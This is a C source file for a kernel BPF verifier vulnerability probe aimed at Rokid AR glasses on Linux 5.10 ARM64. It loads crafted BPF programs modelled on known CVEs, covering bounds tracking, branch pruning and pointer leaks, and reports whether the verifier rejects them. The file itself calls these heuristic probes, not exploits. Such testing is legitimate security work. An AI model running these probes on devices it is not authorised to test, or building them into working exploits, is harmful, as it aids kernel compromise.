/*
 * BPF Verifier Vulnerability Probe
 * =================================
 *
 * TARGET:  Rokid AR Glasses - Linux 5.10.209-perf (ARM64)
 * PURPOSE: Detect exploitable BPF verifier vulnerabilities
 *
 * TESTED CVEs:
 * - CVE-2023-2163:  Incorrect verifier pruning (fixed in 5.10.179)
 * - CVE-2023-39191: Type confusion in btf_type_tag (fixed in 5.10.198)
 * - CVE-2022-23222: PTR_TO_MEM bounds bypass (fixed in 5.10.94)
 *
 * Since kernel 5.10.209 is > 5.10.198, these may be patched.
 * This tool performs safe probing to check verifier behavior.
 *
 * COMPILE:
 *   aarch64-linux-gnu-gcc -static -O2 -o bpf_vuln_probe bpf_vuln_probe.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

#ifndef __NR_bpf
#define __NR_bpf 280
#endif

// BPF instruction helpers
#define BPF_ALU64_IMM(OP, DST, IMM)                            \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_K, \
                       .dst_reg = DST,                         \
                       .src_reg = 0,                           \
                       .off = 0,                               \
                       .imm = IMM})

#define BPF_ALU64_REG(OP, DST, SRC)                            \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_OP(OP) | BPF_X, \
                       .dst_reg = DST,                         \
                       .src_reg = SRC,                         \
                       .off = 0,                               \
                       .imm = 0})

#define BPF_MOV64_IMM(DST, IMM)                             \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_K, \
                       .dst_reg = DST,                      \
                       .src_reg = 0,                        \
                       .off = 0,                            \
                       .imm = IMM})

#define BPF_MOV64_REG(DST, SRC)                             \
    ((struct bpf_insn){.code = BPF_ALU64 | BPF_MOV | BPF_X, \
                       .dst_reg = DST,                      \
                       .src_reg = SRC,                      \
                       .off = 0,                            \
                       .imm = 0})

#define BPF_LD_MAP_FD(DST, MAP_FD)                        \
    ((struct bpf_insn){.code = BPF_LD | BPF_DW | BPF_IMM, \
                       .dst_reg = DST,                    \
                       .src_reg = BPF_PSEUDO_MAP_FD,      \
                       .off = 0,                          \
                       .imm = (__u32)(MAP_FD)}),          \
        ((struct bpf_insn){.code = 0, .dst_reg = 0, .src_reg = 0, .off = 0, .imm = (__u32)((uint64_t)(MAP_FD) >> 32)})

#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)                           \
    ((struct bpf_insn){.code = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM, \
                       .dst_reg = DST,                             \
                       .src_reg = SRC,                             \
                       .off = OFF,                                 \
                       .imm = 0})

#define BPF_STX_MEM(SIZE, DST, SRC, OFF)                           \
    ((struct bpf_insn){.code = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM, \
                       .dst_reg = DST,                             \
                       .src_reg = SRC,                             \
                       .off = OFF,                                 \
                       .imm = 0})

#define BPF_ST_MEM(SIZE, DST, OFF, IMM)                           \
    ((struct bpf_insn){.code = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM, \
                       .dst_reg = DST,                            \
                       .src_reg = 0,                              \
                       .off = OFF,                                \
                       .imm = IMM})

#define BPF_JMP_IMM(OP, DST, IMM, OFF)                       \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_K, \
                       .dst_reg = DST,                       \
                       .src_reg = 0,                         \
                       .off = OFF,                           \
                       .imm = IMM})

#define BPF_JMP_REG(OP, DST, SRC, OFF)                       \
    ((struct bpf_insn){.code = BPF_JMP | BPF_OP(OP) | BPF_X, \
                       .dst_reg = DST,                       \
                       .src_reg = SRC,                       \
                       .off = OFF,                           \
                       .imm = 0})

#define BPF_EXIT_INSN()                            \
    ((struct bpf_insn){.code = BPF_JMP | BPF_EXIT, \
                       .dst_reg = 0,               \
                       .src_reg = 0,               \
                       .off = 0,                   \
                       .imm = 0})

#define BPF_CALL_INSN(HELPER)                      \
    ((struct bpf_insn){.code = BPF_JMP | BPF_CALL, \
                       .dst_reg = 0,               \
                       .src_reg = 0,               \
                       .off = 0,                   \
                       .imm = HELPER})

// BPF register definitions
#define BPF_REG_0 0
#define BPF_REG_1 1
#define BPF_REG_2 2
#define BPF_REG_3 3
#define BPF_REG_4 4
#define BPF_REG_5 5
#define BPF_REG_6 6
#define BPF_REG_7 7
#define BPF_REG_8 8
#define BPF_REG_9 9
#define BPF_REG_10 10
#define BPF_REG_FP BPF_REG_10

// BPF helpers
#define BPF_FUNC_map_lookup_elem 1
#define BPF_FUNC_map_update_elem 2
#define BPF_FUNC_probe_read 4
#define BPF_FUNC_ktime_get_ns 5
#define BPF_FUNC_get_current_pid_tgid 14

// =============================================================================
// BPF System Call Wrappers
// =============================================================================

static int bpf(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

static int bpf_create_map(int type, int key_size, int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = type,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}

static char bpf_log_buf[65536];

static int bpf_load_program(int type, struct bpf_insn *insns, int insn_cnt,
                            const char *license)
{
    union bpf_attr attr = {
        .prog_type = type,
        .insns = (uint64_t)insns,
        .insn_cnt = insn_cnt,
        .license = (uint64_t)license,
        .log_buf = (uint64_t)bpf_log_buf,
        .log_size = sizeof(bpf_log_buf),
        .log_level = 1,
    };

    int fd = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    return fd;
}

// =============================================================================
// Vulnerability Probes
// =============================================================================

/*
 * Probe 1: Basic BPF functionality
 * Simply checks if unprivileged BPF is available
 */
static int probe_bpf_available(void)
{
    printf("[*] Probe 1: Checking BPF availability...\n");

    // Try to create a simple map
    int map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 1);
    if (map_fd < 0)
    {
        printf("    [-] BPF map creation failed: %s\n", strerror(errno));
        return 0;
    }

    printf("    [+] BPF map creation: SUCCESS (fd=%d)\n", map_fd);

    // Try to load a simple program
    struct bpf_insn prog[] = {
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = bpf_load_program(BPF_PROG_TYPE_SOCKET_FILTER, prog, 2, "GPL");
    if (prog_fd < 0)
    {
        printf("    [-] BPF program load failed: %s\n", strerror(errno));
        printf("    Verifier log: %s\n", bpf_log_buf);
        close(map_fd);
        return 0;
    }

    printf("    [+] BPF program load: SUCCESS (fd=%d)\n", prog_fd);

    close(map_fd);
    close(prog_fd);
    return 1;
}

/*
 * Probe 2: ALU32 bounds tracking (CVE-2021-3490 style)
 * Tests if verifier properly tracks 32-bit ALU operations
 */
static int probe_alu32_bounds(void)
{
    printf("\n[*] Probe 2: ALU32 bounds tracking...\n");

    int map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 1);
    if (map_fd < 0)
        return 0;

    // This program tests bounds tracking with 32-bit ops
    struct bpf_insn prog[] = {
        // r6 = 0
        BPF_MOV64_IMM(BPF_REG_6, 0),

        // r1 = map_fd
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),

        // r2 = fp - 8 (key on stack)
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
        BPF_ST_MEM(BPF_W, BPF_REG_FP, -8, 0),

        // r0 = map_lookup_elem(map_fd, &key)
        BPF_CALL_INSN(BPF_FUNC_map_lookup_elem),

        // if (r0 == NULL) exit
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 10),

        // r7 = *r0 (load value from map)
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        // Test: w7 &= 0xFFFF (32-bit AND)
        // Verifier should track that r7 is now [0, 0xFFFF]
        {.code = BPF_ALU | BPF_AND | BPF_K,
         .dst_reg = BPF_REG_7,
         .src_reg = 0,
         .off = 0,
         .imm = 0xFFFF},

        // r7 *= 8 (potential overflow if bounds not tracked)
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 8),

        // if (r7 > 0x7FFF8) exit
        BPF_JMP_IMM(BPF_JGT, BPF_REG_7, 0x7FFF8, 4),

        // r0 += r7 (add offset)
        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_7),

        // Try to read - should fail bounds check
        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),

        // r0 = 0
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        // Exit path
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = bpf_load_program(BPF_PROG_TYPE_SOCKET_FILTER,
                                   prog, sizeof(prog) / sizeof(prog[0]), "GPL");

    close(map_fd);

    if (prog_fd >= 0)
    {
        printf("    [!] ALU32 bounds check may be vulnerable!\n");
        printf("    Verifier log: %s\n", bpf_log_buf);
        close(prog_fd);
        return 1;
    }
    else
    {
        printf("    [+] ALU32 bounds check: SECURE\n");
        printf("    (Verifier correctly rejected the program)\n");
        return 0;
    }
}

/*
 * Probe 3: Register spill/fill tracking
 * Tests if verifier properly tracks register state after spill/fill
 */
static int probe_spill_fill(void)
{
    printf("\n[*] Probe 3: Register spill/fill tracking...\n");

    int map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 1);
    if (map_fd < 0)
        return 0;

    struct bpf_insn prog[] = {
        // Spill a scalar to stack
        BPF_MOV64_IMM(BPF_REG_6, 0x1000),
        BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_6, -8),

        // Load from map
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -16),
        BPF_ST_MEM(BPF_W, BPF_REG_FP, -16, 0),
        BPF_CALL_INSN(BPF_FUNC_map_lookup_elem),

        // Check NULL
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 5),

        // Fill the scalar back
        BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_FP, -8),

        // Use it as offset - verifier should know it's 0x1000
        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_6),
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = bpf_load_program(BPF_PROG_TYPE_SOCKET_FILTER,
                                   prog, sizeof(prog) / sizeof(prog[0]), "GPL");

    close(map_fd);

    if (prog_fd >= 0)
    {
        printf("    [!] Spill/fill tracking may be vulnerable!\n");
        close(prog_fd);
        return 1;
    }
    else
    {
        printf("    [+] Spill/fill tracking: SECURE\n");
        return 0;
    }
}

/*
 * Probe 4: Pointer arithmetic bounds (CVE-2022-23222 style)
 * Tests PTR_TO_MEM bounds handling
 */
static int probe_ptr_bounds(void)
{
    printf("\n[*] Probe 4: Pointer arithmetic bounds...\n");

    int map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 256, 1);
    if (map_fd < 0)
        return 0;

    struct bpf_insn prog[] = {
        // Get map value pointer
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
        BPF_ST_MEM(BPF_W, BPF_REG_FP, -8, 0),
        BPF_CALL_INSN(BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 10),

        // r6 = r0 (save ptr)
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // r7 = *(r0 + 0) - load user controlled value
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),

        // Bound check: if r7 > 200, exit
        BPF_JMP_IMM(BPF_JGT, BPF_REG_7, 200, 5),

        // r6 += r7 (ptr + offset)
        BPF_ALU64_REG(BPF_ADD, BPF_REG_6, BPF_REG_7),

        // Try to read at ptr + offset
        // Should fail if verifier properly tracks bounds
        BPF_LDX_MEM(BPF_B, BPF_REG_8, BPF_REG_6, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = bpf_load_program(BPF_PROG_TYPE_SOCKET_FILTER,
                                   prog, sizeof(prog) / sizeof(prog[0]), "GPL");

    close(map_fd);

    if (prog_fd >= 0)
    {
        printf("    [+] Pointer bounds check allows bounded access\n");
        close(prog_fd);
        // This is expected behavior - not a vulnerability
        return 0;
    }
    else
    {
        printf("    [*] Pointer bounds check: STRICT\n");
        return 0;
    }
}

/*
 * Probe 5: Branch pruning (CVE-2023-2163 style)
 * Tests if verifier incorrectly prunes code paths
 */
static int probe_branch_pruning(void)
{
    printf("\n[*] Probe 5: Branch pruning (CVE-2023-2163 style)...\n");

    int map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 1);
    if (map_fd < 0)
        return 0;

    /*
     * This tests a simplified version of CVE-2023-2163.
     * The vulnerability was in how verifier prunes branches.
     * If a branch condition appears identical to a previous one,
     * verifier may incorrectly assume the path is equivalent.
     */
    struct bpf_insn prog[] = {
        BPF_MOV64_IMM(BPF_REG_6, 0),

        // Get ktime for "random" value
        BPF_CALL_INSN(BPF_FUNC_ktime_get_ns),
        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

        // First branch: if (r7 & 1) == 0
        BPF_ALU64_IMM(BPF_AND, BPF_REG_7, 1),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_7, 0, 2),

        // True path: set r6 = 1
        BPF_MOV64_IMM(BPF_REG_6, 1),
        BPF_JMP_IMM(BPF_JA, 0, 0, 1),

        // False path: r6 stays 0
        BPF_MOV64_IMM(BPF_REG_6, 0),

        // Second identical branch - verifier might prune
        BPF_CALL_INSN(BPF_FUNC_ktime_get_ns),
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),
        BPF_ALU64_IMM(BPF_AND, BPF_REG_8, 1),
        BPF_JMP_IMM(BPF_JEQ, BPF_REG_8, 0, 2),

        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 1),
        BPF_JMP_IMM(BPF_JA, 0, 0, 1),

        BPF_ALU64_IMM(BPF_ADD, BPF_REG_6, 0),

        // Return r6
        BPF_MOV64_REG(BPF_REG_0, BPF_REG_6),
        BPF_EXIT_INSN(),
    };

    int prog_fd = bpf_load_program(BPF_PROG_TYPE_SOCKET_FILTER,
                                   prog, sizeof(prog) / sizeof(prog[0]), "GPL");

    close(map_fd);

    if (prog_fd >= 0)
    {
        printf("    [+] Branch program loads successfully\n");
        printf("    (Further analysis needed to confirm vulnerability)\n");
        close(prog_fd);
        return 0; // Need actual exploitation to confirm
    }
    else
    {
        printf("    [+] Branch pruning test: Program rejected\n");
        return 0;
    }
}

/*
 * Probe 6: Map pointer leak attempt
 * Tests if we can leak map addresses through verifier
 */
static int probe_map_leak(void)
{
    printf("\n[*] Probe 6: Map pointer leak attempt...\n");

    int map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, 4, 8, 1);
    if (map_fd < 0)
        return 0;

    // Try to use map_lookup_elem and write the pointer value to map
    struct bpf_insn prog[] = {
        // Lookup element
        BPF_LD_MAP_FD(BPF_REG_1, map_fd),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
        BPF_ST_MEM(BPF_W, BPF_REG_FP, -8, 0),
        BPF_CALL_INSN(BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JEQ, BPF_REG_0, 0, 4),

        // Save pointer
        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),

        // Try to write the pointer VALUE (not content) back to map
        // This should fail - verifier shouldn't allow pointer to scalar
        BPF_STX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN(),
    };

    int prog_fd = bpf_load_program(BPF_PROG_TYPE_SOCKET_FILTER,
                                   prog, sizeof(prog) / sizeof(prog[0]), "GPL");

    close(map_fd);

    if (prog_fd >= 0)
    {
        printf("    [!] Map pointer leak may be possible!\n");
        printf("    Verifier allowed storing pointer to map\n");
        close(prog_fd);
        return 1;
    }
    else
    {
        printf("    [+] Map pointer leak: BLOCKED\n");
        printf("    Verifier correctly prevented pointer leak\n");
        return 0;
    }
}

// =============================================================================
// Main
// =============================================================================

int main(int argc, char **argv)
{
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  BPF Verifier Vulnerability Probe                            ║\n");
    printf("║  Target: Linux 5.10.x ARM64                                  ║\n");
    printf("╚══════════════════════════════════════════════════════════════╝\n\n");

    // Check kernel version
    FILE *fp = fopen("/proc/version", "r");
    if (fp)
    {
        char buf[256];
        if (fgets(buf, sizeof(buf), fp))
        {
            printf("[*] %s", buf);
        }
        fclose(fp);
    }

    // Check BPF sysctl
    fp = fopen("/proc/sys/kernel/unprivileged_bpf_disabled", "r");
    if (fp)
    {
        int val = 1;
        fscanf(fp, "%d", &val);
        printf("[*] unprivileged_bpf_disabled = %d\n", val);
        fclose(fp);

        if (val != 0)
        {
            printf("\n[!] Unprivileged BPF is disabled. Probes will fail.\n");
            return 1;
        }
    }

    printf("[*] UID: %d, EUID: %d\n\n", getuid(), geteuid());

    // Run probes
    int vulns_found = 0;

    if (!probe_bpf_available())
    {
        printf("\n[!] BPF not available. Cannot continue.\n");
        return 1;
    }

    vulns_found += probe_alu32_bounds();
    vulns_found += probe_spill_fill();
    vulns_found += probe_ptr_bounds();
    vulns_found += probe_branch_pruning();
    vulns_found += probe_map_leak();

    // Summary
    printf("\n");
    printf("╔══════════════════════════════════════════════════════════════╗\n");
    printf("║  PROBE SUMMARY                                               ║\n");
    printf("╠══════════════════════════════════════════════════════════════╣\n");

    if (vulns_found > 0)
    {
        printf("║  [!] Potential vulnerabilities found: %d                     ║\n", vulns_found);
        printf("║  Further manual analysis recommended.                        ║\n");
    }
    else
    {
        printf("║  [+] No obvious vulnerabilities detected.                    ║\n");
        printf("║  BPF verifier appears to be properly patched.                ║\n");
    }

    printf("╚══════════════════════════════════════════════════════════════╝\n");

    printf("\n[*] Notes:\n");
    printf("    - These are heuristic probes, not full exploits\n");
    printf("    - A negative result doesn't guarantee security\n");
    printf("    - Consider testing CVE-specific PoCs for confirmation\n");
    printf("\n");

    return 0;
}
